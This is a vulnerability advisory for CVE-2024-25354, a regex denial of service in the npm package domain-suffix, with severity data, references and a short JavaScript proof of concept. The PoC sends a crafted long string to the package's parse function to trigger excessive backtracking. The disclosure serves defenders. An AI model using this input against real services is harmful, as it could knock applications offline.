# [H] domain-suffix RegEx Denial of Service

## Summary
Severity: High
Advisory: GHSA-cqfh-c4c5-c2hg
CVE: CVE-2024-25354
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-03-28
Source: https://github.com/advisories/GHSA-cqfh-c4c5-c2hg
Type: github-advisory

## Affected
- npm: `domain-suffix` — affected >=0

## Details
RegEx Denial of Service in domain-suffix 1.0.8 allows attackers to crash the application via crafted input to the parse function.

## PoC
```js
async function exploit() {
   const domainsuffix = require(\"domain-suffix\");
   // Crafting a string that will cause excessive backtracking
   const maliciousInput = \"a.\".repeat(10000) + \"b\"; // This will create a long sequence of \"a.\" followed by \"b\"
   const result = await domainsuffix.domainSuffix.parse(maliciousInput);
}
await exploit();
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2024-25354
- https://gist.github.com/6en6ar/c3b11b4058b8e2bc54717408d451fb79
- https://github.com/ikrong/domain-suffix
- https://github.com/ikrong/domain-suffix/blob/master/src/domainSuffix.ts
